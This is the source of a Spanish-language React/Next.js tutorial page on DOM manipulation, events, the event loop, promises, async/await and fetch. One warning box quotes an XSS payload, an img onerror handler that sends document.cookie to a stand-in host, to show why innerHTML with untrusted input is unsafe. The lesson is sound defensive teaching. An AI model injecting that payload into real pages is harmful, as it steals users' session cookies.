import Link from "next/link";
import Leccion from "@/components/Leccion";
import Seccion from "@/components/Seccion";
import Codigo from "@/components/Codigo";
import Demo from "@/components/Demo";
import Nota from "@/components/Nota";
import Desafio from "@/components/Desafio";
import Comparacion, { Columna } from "@/components/Comparacion";
import ListaDom from "./ListaDom";
import BloqueoDemo from "./BloqueoDemo";
import OrdenDemo from "./OrdenDemo";
import PromesasDemo from "./PromesasDemo";
import ParaleloDemo from "./ParaleloDemo";

export const metadata = { title: "El DOM y la asincronía" };

export default function Pagina() {
  return (
    <Leccion
      slug="/js/dom-y-asincronia"
      titulo="El DOM y la asincronía"
      resumen="Modificar la página desde JavaScript, escuchar al usuario, y cómo se escribe lo que tarda."
    >
      <Seccion titulo="El DOM: el árbol que arma el navegador">
        <p>
          Con <Link href="/js/fundamentos">los fundamentos</Link> firmes, faltan
          las dos cosas que hacen que una página esté viva: tocar el documento y
          manejar lo que tarda. Van juntas en una sola lección porque en la
          práctica aparecen juntas: pedís algo, tarda, y cuando llega hay que
          mostrarlo.
        </p>

        <p>
          Tu archivo <code>.html</code> es texto. El navegador lo lee una sola
          vez y con eso construye en memoria un árbol de objetos: eso es el{" "}
          <strong>DOM</strong>. El HTML es el plano; el DOM es el edificio.
        </p>

        <Codigo
          archivo="el-plano.html"
          codigo={`<body>
  <h1 class="titulo">Hola</h1>
  <ul id="tareas"><li>Estudiar</li></ul>
</body>

<!-- El navegador arma con eso un árbol de objetos:
  document → html → body
                     ├── h1.titulo → { textContent: "Hola", classList: […] }
                     └── ul#tareas
                          └── li   → { textContent: "Estudiar", … }        -->`}
        />

        <p>
          Cada nodo es un objeto de JavaScript con propiedades y métodos, y{" "}
          <code>document</code> es la puerta de entrada al árbol entero. De ahí
          sale una consecuencia que confunde a todo el mundo la primera vez:{" "}
          <strong>
            lo que ves en el inspector puede no coincidir con tu archivo
          </strong>
          . <em>Ver código fuente</em> (Ctrl+U) te muestra el texto que mandó el
          servidor; el inspector te muestra el DOM tal como está <em>ahora</em>.
          Si tu código agregó, borró o cambió nodos, el archivo sigue igual y el
          árbol no. Y si el HTML venía mal cerrado, el navegador lo arregla al
          construir el árbol, así que la diferencia aparece incluso antes de que
          corra una línea de JavaScript. Cómo llegó ese archivo hasta acá está en{" "}
          <Link href="/html/bases">cómo funciona la web</Link>.
        </p>
      </Seccion>

      <Seccion titulo="Seleccionar y modificar">
        <p>
          Para tocar un nodo primero hay que encontrarlo. Hay dos funciones y con
          esas dos alcanza:
        </p>

        <Codigo
          archivo="seleccionar.js"
          resaltar={[2, 5]}
          codigo={`// Devuelve el PRIMERO que coincide, o null si no hay ninguno.
const titulo = document.querySelector("h1.titulo");

// Devuelve TODOS los que coinciden, en el orden del documento.
const items = document.querySelectorAll("#tareas li");

// Y también se puede buscar adentro de un nodo, no en todo el documento.
const primero = lista.querySelector("li");`}
        />

        <p>
          Lo importante:{" "}
          <strong>
            los selectores son exactamente los mismos de{" "}
            <Link href="/css/selectores">CSS</Link>
          </strong>
          . Si sabés escribir <code>.tarjeta &gt; p:first-child</code> en una
          hoja de estilos, ya sabés buscar nodos. Ojo con una sola cosa:{" "}
          <code>querySelectorAll</code> devuelve una <code>NodeList</code>, que
          tiene <code>forEach</code> y <code>length</code> pero{" "}
          <strong>no</strong> <code>map</code> ni <code>filter</code>. Si los
          necesitás, convertila con <code>[...items]</code>.
        </p>

        <h3>textContent contra innerHTML</h3>
        <p>
          Las dos escriben adentro de un nodo, pero hacen cosas muy distintas.{" "}
          <code>textContent</code> pone texto y nada más:{" "}
          <code>caja.textContent = &quot;&lt;b&gt;Ana&lt;/b&gt;&quot;</code>{" "}
          muestra esos caracteres tal cual. <code>innerHTML</code> interpreta lo
          que le pasás como HTML y lo convierte en nodos: la misma línea con{" "}
          <code>innerHTML</code> muestra <strong>Ana</strong> en negrita.
        </p>

        <Nota tipo="atencion" titulo="innerHTML con datos de afuera es un agujero de seguridad">
          <p>
            Si el texto lo escribió un usuario, vino de un servidor o salió de la
            URL, <code>innerHTML</code> ejecuta lo que le metan. Eso se llama{" "}
            <strong>XSS</strong> y es de las vulnerabilidades más comunes que hay:
          </p>
          <Codigo
            archivo="xss.js"
            codigo={`const comentario = entrada.value;   // el usuario escribió:
// <img src=x onerror="fetch('https://malo.ejemplo/robar?c='+document.cookie)">

caja.innerHTML = comentario;   // ✘ el navegador lo ejecuta: se van las cookies
caja.textContent = comentario; // ✔ se ve el texto, no pasa nada`}
          />
          <p style={{ marginBottom: 0 }}>
            La regla: <strong>textContent por defecto</strong>.{" "}
            <code>innerHTML</code> solo con HTML fijo que escribiste vos, sin
            ningún dato de afuera pegado adentro.
          </p>
        </Nota>

        <h3>Clases y estilos</h3>
        <p>
          <code>classList</code> agrega y saca clases sin pisar las que ya
          estaban; <code>style</code> escribe estilos en línea, propiedad por
          propiedad. Entre las dos{" "}
          <strong>casi siempre conviene <code>classList</code></strong>: la
          apariencia queda en la hoja de estilos, que es donde va, y el
          JavaScript solo decide en qué estado está la cosa.
        </p>

        <Codigo
          archivo="apariencia.js"
          resaltar={[3, 10]}
          codigo={`item.classList.add("activo");
item.classList.remove("oculto");
item.classList.toggle("hecha");   // si está la saca, si no está la pone
item.classList.contains("hecha"); // true / false

item.className = "activo";        // ✘ pisa TODAS las clases que tenía

// Estilos en línea. El nombre va en camelCase, no con guiones.
item.style.backgroundColor = "#e4eefb";
item.style.display = "none";`}
        />
      </Seccion>

      <Seccion titulo="Crear, borrar y escuchar">
        <p>
          Crear un nodo es un método; meterlo en el árbol es otro. Mientras no lo
          insertes en ningún lado, el nodo existe pero no se ve.
        </p>

        <Codigo
          archivo="crear.js"
          resaltar={[4, 5]}
          codigo={`const item = document.createElement("li");   // existe, pero está suelto
item.textContent = "Tarea nueva";

lista.append(item);   // append lo mete al final. Acepta varios de una.
item.remove();        // y el nodo se borra solo: no hay que buscarle el padre`}
        />

        <h3>Escuchar eventos</h3>
        <p>
          <code>addEventListener</code> recibe el nombre del evento y una
          función. El navegador la guarda y la llama cuando el evento pasa,
          pasándole un <strong>objeto del evento</strong> con todo lo que hace
          falta saber.
        </p>

        <Codigo
          archivo="eventos.js"
          resaltar={[2, 4, 7]}
          codigo={`boton.addEventListener("click", (evento) => {
  evento.target;          // el nodo EXACTO donde se originó el clic
  evento.currentTarget;   // el nodo donde está colgado este escuchador
  evento.preventDefault();  // cancela lo que el navegador iba a hacer solo:
                            // enviar el formulario, seguir el enlace…
  evento.stopPropagation(); // corta el viaje del evento hacia los padres
});`}
        />

        <p>
          Un evento no se queda donde ocurrió: sube por el árbol avisándole a
          cada antepasado. Eso se llama <strong>propagación</strong>, y está
          explicada en detalle —con su demo— en{" "}
          <Link href="/react/eventos">eventos de React</Link>. El mecanismo es el
          mismo, así que no lo repetimos acá.
        </p>

        <h3>Delegación: un escuchador para muchos hijos</h3>
        <p>
          Justamente porque los eventos suben, podés poner{" "}
          <strong>un solo escuchador en el padre</strong> y ahí adentro
          preguntar, con <code>evento.target</code>, en cuál de los hijos se hizo
          clic. Eso es delegación, y no es una optimización de detalle: es la
          única versión que funciona bien cuando{" "}
          <strong>la lista cambia</strong>. Si le colgás un escuchador a cada{" "}
          <code>&lt;li&gt;</code>, los que agregues después no tienen ninguno y
          hay que acordarse de engancharlos uno por uno. El escuchador del padre
          ya estaba antes de que el hijo existiera.
        </p>

        <Demo titulo="Demo · una lista hecha con DOM puro, adentro de React">
          <ListaDom />
        </Demo>

        <p>
          Agregá tareas, marcalas y borralas: las nuevas responden igual que las
          tres de fábrica, y sin embargo <code>addEventListener</code> se llamó
          una sola vez.
        </p>

        <Codigo
          archivo="app/js/dom-y-asincronia/ListaDom.js"
          resaltar={[4, 13]}
          codigo={`// UN escuchador en el <ul> atiende los clics de todos los <li>, incluidos
// los que todavía no existen cuando esta línea se ejecuta.
function alHacerClic(evento) {
  const item = evento.target.closest(".ldom-item");
  if (!item) return;   // clic en el hueco entre ítems: no hay nada que hacer

  if (evento.target.dataset.accion === "borrar") item.remove();
  else if (evento.target.dataset.accion === "marcar") {
    item.classList.toggle("ldom-hecha");
  }
}

lista.addEventListener("click", alHacerClic);`}
        />

        <p>
          Dos piezas que aparecen siempre en este patrón.{" "}
          <code>closest(selector)</code> sube desde el nodo donde se hizo clic
          hasta el primer antepasado que coincide —hace falta porque el clic
          puede caer en un ícono adentro del botón—, y{" "}
          <code>dataset.accion</code> lee el atributo <code>data-accion</code>{" "}
          del HTML, que es la forma estándar de etiquetar un nodo con
          información propia.
        </p>
      </Seccion>

      <Seccion titulo="En React nada de esto se hace a mano">
        <p>
          Cierre de esta primera parte: todo lo que acabás de ver es{" "}
          <strong>lo que React hace por vos</strong>. En un componente no vas a
          escribir <code>querySelector</code> ni <code>createElement</code> ni{" "}
          <code>textContent</code>. El mismo contador, de los dos lados:
        </p>

        <Comparacion>
          <Columna tono="mal" titulo="DOM a mano: decís CÓMO cambiarlo">
            <Codigo
              archivo="contador-dom.js"
              codigo={`<p id="cuenta">0</p>
<button id="sumar">Sumar</button>

let cuenta = 0;
const salida = document.querySelector("#cuenta");

document.querySelector("#sumar")
  .addEventListener("click", () => {
    cuenta = cuenta + 1;
    // acordate de actualizar la pantalla:
    salida.textContent = cuenta;
  });`}
            />
          </Columna>
          <Columna tono="bien" titulo="React: describís CÓMO TIENE QUE VERSE">
            <Codigo
              archivo="Contador.js"
              codigo={`function Contador() {
  const [cuenta, setCuenta] = useState(0);

  return (
    <>
      <p>{cuenta}</p>
      <button
        type="button"
        onClick={() => setCuenta(cuenta + 1)}
      >
        Sumar
      </button>
    </>
  );
}`}
            />
          </Columna>
        </Comparacion>

        <p>
          El cambio de mentalidad es ese y es todo. A la izquierda escribís una
          receta de pasos: buscá este nodo, cambiale este texto. Si mañana el
          contador también aparece en el título, tenés que acordarte de agregar
          otra línea; si te olvidás, la pantalla queda mintiendo.
        </p>

        <p>
          A la derecha no hay ninguna instrucción de cambio: escribís{" "}
          <em>
            cómo tiene que verse la pantalla para un valor de{" "}
            <code>cuenta</code>
          </em>
          , y cuando el valor cambia React vuelve a llamar a tu función, compara
          el resultado con lo que hay y hace los <code>textContent</code> y los{" "}
          <code>append</code> que correspondan. Es imposible que se te olvide
          actualizar algo, porque nunca actualizás nada. Eso son los{" "}
          <Link href="/react/componentes">componentes</Link> y{" "}
          <Link href="/react/estado">useState</Link>.
        </p>

        <Nota tipo="info" titulo="Entonces, ¿para qué aprender DOM?">
          <p style={{ marginBottom: 0 }}>
            Porque React por dentro hace exactamente esto, y saberlo deja de
            convertirlo en magia. Porque los selectores, los eventos y la
            propagación son los mismos en los dos mundos. Y porque de vez en
            cuando hay que bajar a este nivel —medir un elemento, darle el foco a
            un input, enchufar una librería que no sabe nada de React—: para eso
            están las <strong>refs</strong>, que te dan el nodo real. El demo de
            arriba es justamente eso: un <code>useRef</code> apuntando a un{" "}
            <code>&lt;div&gt;</code> vacío y DOM puro adentro.
          </p>
        </Nota>
      </Seccion>

      <Seccion titulo="Un solo hilo: por qué la página se congela">
        <p>
          Segunda parte. JavaScript tiene{" "}
          <strong>un solo hilo de ejecución</strong>: hace una cosa por vez. Y
          ese mismo hilo es el que responde a tus clics, el que corre las
          animaciones y el que dibuja la pantalla. O sea que mientras tu función
          esté corriendo, <strong>no pasa nada más</strong>: ni un clic, ni un
          repintado. Si algo tarda dos segundos y lo esperás bloqueando, la
          página está muerta durante dos segundos. Probalo:
        </p>

        <Demo titulo="Demo · bloquear el hilo contra esperar sin bloquear">
          <BloqueoDemo />
        </Demo>

        <p>
          Los dos botones esperan lo mismo. El primero da vueltas en un{" "}
          <code>while</code> hasta que pasen 2000 milisegundos: el contador se
          clava, el cuadradito no se mueve y lo que tipeás aparece todo junto al
          final. El segundo le pide el temporizador al navegador y{" "}
          <em>suelta el hilo</em>: todo sigue funcionando.
        </p>

        <Codigo
          archivo="app/js/dom-y-asincronia/BloqueoDemo.js"
          resaltar={[4, 12]}
          codigo={`function bloquear() {
  const inicio = performance.now();
  // Bucle que no suelta el hilo: hasta que no termine, nada más puede correr.
  while (performance.now() - inicio < 2000) {
    /* quema tiempo del único hilo que hay */
  }
}

async function noBloquear() {
  // El temporizador lo maneja el navegador por afuera, y esta función se
  // suspende —sin ocupar el hilo— hasta que la promesa se cumpla.
  await new Promise((resolve) => setTimeout(resolve, 2000));
}`}
        />

        <p>
          <strong>Esa es toda la idea de la asincronía.</strong> No es que
          JavaScript haga dos cosas a la vez: es que aprende a{" "}
          <em>irse y volver</em> en lugar de quedarse esperando. Todo lo que
          sigue son las tres formas de escribir ese &quot;volver&quot;.
        </p>
      </Seccion>

      <Seccion titulo="El bucle de eventos">
        <p>
          Para que ese mecanismo tenga sentido hacen falta cuatro piezas. No es
          teoría de adorno: sin esto, el orden en que corren las cosas parece
          arbitrario.
        </p>

        <ul>
          <li>
            <strong>La pila</strong>: las funciones que están corriendo ahora
            mismo. Es el único lugar donde tu código se ejecuta, y hay una sola.
          </li>
          <li>
            <strong>Las APIs del entorno</strong>: temporizadores, red, eventos.
            No son JavaScript, las maneja el navegador (o Node) por afuera. Por
            eso <code>setTimeout</code> no ocupa la pila mientras espera.
          </li>
          <li>
            <strong>La cola de tareas</strong>: cuando una de esas APIs termina,
            deja su función acá, haciendo fila.
          </li>
          <li>
            <strong>La cola de microtareas</strong>: una segunda fila, para lo
            que dejan las promesas. Tiene prioridad sobre la otra.
          </li>
        </ul>

        <p>
          El <strong>bucle de eventos</strong> es la regla que las une, y es de
          una sola línea:{" "}
          <em>
            cuando la pila queda vacía, se vacía entera la cola de microtareas, y
            recién ahí se toma UNA tarea de la otra cola
          </em>
          . Después, de nuevo.
        </p>

        <Nota tipo="atencion" titulo="setTimeout(fn, 0) no corre ya mismo">
          <p style={{ marginBottom: 0 }}>
            El número no es &quot;en cuánto se ejecuta&quot;, es{" "}
            <strong>el mínimo que tiene que esperar antes de hacer fila</strong>.
            Con <code>0</code>, la función va a la cola de tareas
            inmediatamente… y de ahí no sale hasta que tu código sincrónico haya
            terminado <em>y</em> las microtareas también. Si tu código tarda
            cinco segundos, tu <code>setTimeout(fn, 0)</code> corre en cinco
            segundos.
          </p>
        </Nota>

        <p>
          Este demo es el corazón de la lección. El código de abajo está escrito
          en un orden; el registro numera el orden en que el motor lo ejecuta de
          verdad. Antes de tocar el botón, tratá de predecir la lista:
        </p>

        <Demo titulo="Demo · el orden real de ejecución">
          <OrdenDemo />
        </Demo>

        <Codigo
          archivo="app/js/dom-y-asincronia/OrdenDemo.js"
          resaltar={[2, 5, 9, 15, 23]}
          codigo={`function correr() {
  anotar("arranca la función", "sincronico");

  setTimeout(() => {
    anotar("setTimeout(…, 0) — el primero", "tarea");
  }, 0);

  Promise.resolve().then(() => {
    anotar(".then() de una promesa ya cumplida", "microtarea");
    // Una microtarea puede encolar otra, y esa nueva se atiende igual antes
    // que el setTimeout que ya estaba esperando desde hace rato.
    queueMicrotask(() => {
      anotar("queueMicrotask encolada desde el .then", "microtarea");
    });
  });

  (async () => {
    anotar("lo que está ARRIBA del await corre ya mismo", "sincronico");
    await null;
    anotar("lo que está ABAJO del await es una microtarea", "microtarea");
  })();

  setTimeout(() => {
    anotar("setTimeout(…, 0) — el segundo", "tarea");
  }, 0);

  anotar("última línea de la función", "sincronico");
}`}
        />

        <p>
          Tres conclusiones que valen para todo lo que sigue.{" "}
          <strong>Todo lo sincrónico corre antes que cualquier otra cosa</strong>
          , sin importar dónde esté escrito.{" "}
          <strong>Las microtareas se cuelan adelante</strong> de todos los{" "}
          <code>setTimeout</code>, aunque los hayan encolado después. Y la que
          importa de verdad: <code>await</code> <strong>no detiene nada</strong>{" "}
          —parte tu función en dos, corre la primera mitad ya y anota la segunda
          como microtarea.
        </p>
      </Seccion>

      <Seccion titulo="Callbacks: pasarle una función al que tarda">
        <p>
          La forma más vieja de escribir ese &quot;volver&quot; es la más
          directa: le pasás tu función a quien va a tardar, y que te llame él
          cuando termine. Esa función se llama <strong>callback</strong>.
        </p>

        <Codigo
          archivo="callback.js"
          resaltar={[4]}
          codigo={`// setTimeout es el ejemplo mínimo: le pasás una función y un tiempo.
setTimeout(() => avisar("pasaron 2 segundos"), 2000);

// La convención vieja es "error primero": el primer parámetro es el error.
buscarUsuario(7, (error, usuario) => {
  if (error) return mostrar(error);
  pintar(usuario);
});`}
        />

        <p>
          Funciona perfecto para una cosa. El problema aparece cuando el
          resultado de un pedido es la entrada del siguiente, que es lo normal:
          buscar el usuario, después su pedido, después el envío de ese pedido.
          Cada paso se mete adentro del anterior y sale una pirámide.
        </p>

        <Comparacion>
          <Columna tono="mal" titulo="El infierno de callbacks">
            <Codigo
              archivo="callbacks.js"
              codigo={`buscarUsuario(7, (err, usuario) => {
  if (err) return mostrar(err);

  buscarPedido(usuario.id, (err, pedido) => {
    if (err) return mostrar(err);

    buscarEnvio(pedido.id, (err, envio) => {
      if (err) return mostrar(err);

      buscarSeguimiento(envio.id, (err, dato) => {
        if (err) return mostrar(err);
        pintar(dato);
      });
    });
  });
});`}
            />
          </Columna>
          <Columna tono="bien" titulo="La misma cadena con promesas">
            <Codigo
              archivo="promesas.js"
              codigo={`buscarUsuario(7)
  .then((usuario) => buscarPedido(usuario.id))
  .then((pedido) => buscarEnvio(pedido.id))
  .then((envio) => buscarSeguimiento(envio.id))
  .then((dato) => pintar(dato))
  .catch(mostrar);`}
            />
          </Columna>
        </Comparacion>

        <p>
          Mirá lo que se fue: cuatro niveles de indentación y{" "}
          <strong>el mismo bloque de error copiado cuatro veces</strong>.
        </p>
      </Seccion>

      <Seccion titulo="Promesas">
        <p>
          Una promesa es un objeto que representa{" "}
          <strong>un resultado que todavía no llegó</strong>. Existe desde el
          momento en que pedís algo, y está en uno de tres estados:{" "}
          <strong>pendiente</strong> —todavía no se sabe, así nace—,{" "}
          <strong>cumplida</strong> —llegó el valor— o{" "}
          <strong>rechazada</strong> —hubo un error—. El cambio es de ida: una
          vez que salió de pendiente, se queda así para siempre. Y se la consulta
          con tres métodos:
        </p>

        <Codigo
          archivo="metodos.js"
          resaltar={[2, 3, 4]}
          codigo={`buscarUsuario(7)
  .then((usuario) => { /* se cumplió: acá llega el valor  */ })
  .catch((error)  => { /* se rechazó: acá llega el error  */ })
  .finally(()     => { /* pase lo que pase: apagar el "cargando" */ });`}
        />

        <p>
          Encadenar es lo que las hace valer la pena:{" "}
          <strong>
            si dentro de un <code>.then</code> devolvés otra promesa, el{" "}
            <code>.then</code> siguiente espera a esa
          </strong>
          . Así se arma la cadena plana de la comparación de arriba. Y un solo{" "}
          <code>.catch</code> al final atrapa el error de cualquier eslabón.
        </p>

        <Demo titulo="Demo · una cadena de cuatro pasos, con su error y su finally">
          <PromesasDemo />
        </Demo>

        <Nota tipo="error" titulo="El bug clásico: olvidarse el return">
          <p style={{ marginBottom: 0 }}>
            Es el tercer botón del demo. Si adentro de un <code>.then</code>{" "}
            llamás a otra promesa pero <strong>no la devolvés</strong>, la cadena
            no la espera: ese <code>.then</code> devuelve <code>undefined</code>{" "}
            y el siguiente arranca al toque, con las manos vacías. Y el error de
            esa promesa suelta tampoco cae en tu <code>.catch</code>.
          </p>
        </Nota>

        <h3>Promise.all</h3>
        <p>
          Cuando tenés varias promesas que{" "}
          <strong>no dependen una de otra</strong>, <code>Promise.all</code> las
          espera a todas juntas y te devuelve los resultados{" "}
          <strong>en el orden en que se las pasaste</strong>, no en el orden en
          que fueron llegando.
        </p>

        <Codigo
          archivo="all.js"
          resaltar={[1]}
          codigo={`const [perfil, materias, notas] = await Promise.all([
  buscarPerfil(7), buscarMaterias(7), buscarNotas(7),
]);
// Tarda lo que tarde la más lenta de las tres, no la suma.
// Si UNA se rechaza, Promise.all se rechaza entera, ya mismo.`}
        />

        <p>
          Hay tres primas que alcanza con conocer de nombre:{" "}
          <code>Promise.allSettled</code> espera a todas y te cuenta cómo le fue
          a cada una, sin cortar ante el primer error; <code>Promise.race</code>{" "}
          devuelve la primera que termine, pase lo que pase;{" "}
          <code>Promise.any</code>, la primera que <em>se cumpla</em>. La que se
          usa todos los días es <code>Promise.all</code>.
        </p>
      </Seccion>

      <Seccion titulo="async / await">
        <p>
          <code>async</code> y <code>await</code> no son un mecanismo nuevo: son
          otra forma de escribir exactamente las mismas promesas, con la pinta de
          código de arriba abajo. Tres reglas y ya está:
        </p>

        <ul>
          <li>
            Una función marcada <code>async</code>{" "}
            <strong>siempre devuelve una promesa</strong>, aunque adentro hagas{" "}
            <code>return 5</code>: devuelve una promesa cumplida con 5.
          </li>
          <li>
            <code>await</code> va <strong>adentro</strong> de una{" "}
            <code>async</code>, y desenvuelve la promesa: te da el valor, o tira
            el error.
          </li>
          <li>
            Los errores se manejan con <code>try</code> / <code>catch</code> /{" "}
            <code>finally</code>, los mismos del código sincrónico.
          </li>
        </ul>

        <Comparacion>
          <Columna tono="mal" titulo="Con .then: se lee saltando">
            <Codigo
              archivo="con-then.js"
              codigo={`function cargar(id) {
  mostrarCargando(true);

  return buscarUsuario(id)
    .then((usuario) => buscarPedido(usuario.id))
    .then((pedido) => pintar(pedido))
    .catch((error) => mostrar(error))
    .finally(() => mostrarCargando(false));
}`}
            />
          </Columna>
          <Columna tono="bien" titulo="Con async / await: se lee de corrido">
            <Codigo
              archivo="con-await.js"
              codigo={`async function cargar(id) {
  mostrarCargando(true);
  try {
    const usuario = await buscarUsuario(id);
    const pedido = await buscarPedido(usuario.id);
    pintar(pedido);
  } catch (error) {
    mostrar(error);
  } finally {
    mostrarCargando(false);
  }
}`}
            />
          </Columna>
        </Comparacion>

        <p>
          Las dos hacen lo mismo y las dos devuelven una promesa.{" "}
          <strong>Escribí async/await</strong>; leé <code>.then</code>, porque lo
          vas a encontrar en código ajeno. Y acordate del demo del orden: la
          función no se queda esperando, se <em>suspende</em> y le devuelve el
          hilo al navegador. Lo único que espera es <em>esa</em> función, de la
          línea del <code>await</code> para abajo.
        </p>
      </Seccion>

      <Seccion titulo="El error más común: await adentro de un for">
        <p>
          Este es <em>el</em> error de rendimiento con async/await, y lo comete
          todo el mundo porque el código se ve razonable. Tenés tres pedidos que
          no dependen entre sí y los pedís en un bucle:
        </p>

        <Demo titulo="Demo · los mismos tres pedidos, dos formas de esperarlos">
          <ParaleloDemo />
        </Demo>

        <p>
          Tocá los dos botones y mirá las barras. Con el <code>for</code>, el
          segundo pedido <strong>ni siquiera se envía</strong> hasta que volvió
          el primero: salen una atrás de la otra y el total es la suma. Con{" "}
          <code>Promise.all</code> arrancan las tres juntas y el total es el de
          la más lenta.
        </p>

        <Comparacion>
          <Columna tono="mal" titulo="Secuencial · 1900 ms">
            <Codigo
              archivo="ParaleloDemo.js"
              resaltar={[6]}
              codigo={`async function correrSecuencial(marcar) {
  const t0 = performance.now();
  const desde = () => performance.now() - t0;

  for (const pedido of PEDIDOS) {
    const inicio = desde();
    await pedir(pedido);
    marcar(pedido.nombre, inicio, desde());
  }
  return Math.round(desde());
}`}
            />
          </Columna>
          <Columna tono="bien" titulo="En paralelo · 800 ms">
            <Codigo
              archivo="ParaleloDemo.js"
              resaltar={[5, 10]}
              codigo={`async function correrEnParalelo(marcar) {
  const t0 = performance.now();
  const desde = () => performance.now() - t0;

  const tareas = PEDIDOS.map(async (pedido) => {
    const inicio = desde();
    await pedir(pedido);
    marcar(pedido.nombre, inicio, desde());
  });
  await Promise.all(tareas);
  return Math.round(desde());
}`}
            />
          </Columna>
        </Comparacion>

        <p>
          La clave está en <strong>cuándo empieza cada promesa</strong>. Una
          promesa arranca a trabajar en el momento en que se crea, no cuando le
          hacés <code>await</code>. Si las creás todas primero y esperás después,
          corren solapadas.
        </p>

        <Nota tipo="ok" titulo="Cuándo el for SÍ está bien">
          <p style={{ marginBottom: 0 }}>
            Cuando cada vuelta <strong>necesita</strong> el resultado de la
            anterior —el ID del usuario para buscar su pedido—, o cuando el
            servidor te limita la cantidad de pedidos por segundo y querés ir de
            a uno a propósito. El error no es usar <code>for</code> con{" "}
            <code>await</code>: es usarlo cuando las tareas son independientes.
          </p>
        </Nota>
      </Seccion>

      <Seccion titulo="fetch, en dos párrafos">
        <p>
          <code>fetch</code> es la función del navegador para pedir cosas por
          red, y devuelve una promesa. Tiene una trampa que hay que saber sí o
          sí: <strong>un 404 o un 500 no rechazan la promesa</strong>. Para{" "}
          <code>fetch</code>, &quot;el servidor me contestó 404&quot; es una
          respuesta exitosa: hubo respuesta. Solo rechaza si no pudo{" "}
          <em>llegar</em> al servidor —no hay red, el dominio no existe, lo
          bloqueó CORS—. Si no mirás <code>response.ok</code>, tu{" "}
          <code>.catch</code> no se entera de nada.
        </p>

        <p>
          Lo segundo: la respuesta no trae los datos listos, trae un flujo que
          todavía está llegando. Por eso <code>response.json()</code>{" "}
          <strong>también devuelve una promesa</strong>. Son dos esperas, no una.
        </p>

        <Codigo
          archivo="traer.js"
          resaltar={[5, 7]}
          codigo={`async function traerUsuario(id) {
  try {
    const respuesta = await fetch("/api/usuarios/" + id);  // espera 1
    // ✗ Sin esta línea, un 404 pasa como si todo hubiera salido bien.
    if (!respuesta.ok) throw new Error("HTTP " + respuesta.status);
    return await respuesta.json();                         // espera 2
  } catch (error) {
    // Cae acá tanto el fallo de red como el error que lanzamos arriba.
    return null;
  }
}`}
        />

        <Nota tipo="info" titulo="Y en React, ¿dónde se pone esto?">
          <p style={{ marginBottom: 0 }}>
            No en el cuerpo del componente: eso correría en cada render. Va en un{" "}
            <code>useEffect</code>, con su limpieza por si el componente se
            desmonta antes de que llegue la respuesta, o directamente en un
            componente de servidor, que puede ser <code>async</code> y hacer el{" "}
            <code>await</code> antes de mandar nada al navegador. Eso lo
            desarrolla la lección <em>Efectos</em>, que todavía no está escrita.
          </p>
        </Nota>
      </Seccion>

      <Seccion titulo="Para practicar">
        <Desafio
          titulo="1. Un solo elemento activo, con un solo escuchador"
          pista={
            <p>
              Un escuchador en <code>lista</code>, no uno por ítem.{" "}
              <code>evento.target</code> puede ser algo de adentro del{" "}
              <code>&lt;li&gt;</code>: subí con{" "}
              <code>closest(&quot;li&quot;)</code>. Para sacarle la clase al
              anterior no hace falta recorrer todos: buscá el que ya la tiene con{" "}
              <code>querySelector</code>.
            </p>
          }
          solucion={
            <Codigo
              archivo="activar.js"
              resaltar={[4, 7]}
              codigo={`function activar(lista) {
  lista.addEventListener("click", (evento) => {
    // El clic pudo caer en un <span> adentro del <li>.
    const item = evento.target.closest("li");
    if (!item) return;

    // Puede no haber ninguno activo todavía: por eso el ?.
    lista.querySelector(".activo")?.classList.remove("activo");
    item.classList.add("activo");
  });
}`}
            />
          }
        >
          <p>
            Escribí <code>activar(lista)</code>: recibe un{" "}
            <code>&lt;ul&gt;</code> y hace que al hacer clic en cualquiera de sus{" "}
            <code>&lt;li&gt;</code> ese quede con la clase <code>activo</code> y
            el que la tenía antes la pierda. Un solo{" "}
            <code>addEventListener</code>, y tiene que seguir funcionando con
            los <code>&lt;li&gt;</code> que se agreguen después.
          </p>
        </Desafio>

        <Desafio
          titulo="2. Traer N usuarios sin esperarlos de a uno"
          pista={
            <p>
              Primero creás todas las promesas con <code>map</code>, después
              esperás con <code>Promise.all</code>: nunca un <code>await</code>{" "}
              adentro del bucle. Y cuidado con <code>ids.map(buscarUsuario)</code>
              : <code>map</code> le pasa también el índice y el arreglo, así que
              si <code>buscarUsuario</code> tiene un segundo parámetro le llega
              basura. Envolvela en una flecha.
            </p>
          }
          solucion={
            <Codigo
              archivo="cargar-todos.js"
              resaltar={[4, 5]}
              codigo={`async function cargarTodos(ids) {
  try {
    // Las promesas arrancan todas acá, en el map.
    const tareas = ids.map((id) => buscarUsuario(id));
    return await Promise.all(tareas);
  } catch (error) {
    // Promise.all se rechaza entera apenas una falla.
    return [];
  }
}`}
            />
          }
        >
          <p>
            Escribí <code>cargarTodos(ids)</code>: recibe un arreglo de IDs,
            llama a <code>buscarUsuario(id)</code> —que devuelve una promesa— con
            cada uno, y devuelve el arreglo de usuarios{" "}
            <strong>en el mismo orden que los IDs</strong>. Si alguno falla,
            devolvé un arreglo vacío. Los pedidos tienen que salir todos juntos.
          </p>
        </Desafio>

        <Nota tipo="info" titulo="Lo que quedó afuera a propósito">
          <p style={{ marginBottom: 0 }}>
            Del DOM: <code>cloneNode</code> y <code>&lt;template&gt;</code>,
            recorrer el árbol con <code>parentNode</code> y{" "}
            <code>children</code>, <code>IntersectionObserver</code>. De la
            asincronía: <code>AbortController</code> para cancelar pedidos,{" "}
            <code>for await</code> y los generadores asincrónicos. Nada de eso
            hace falta para entrar a React.
          </p>
        </Nota>
      </Seccion>
    </Leccion>
  );
}
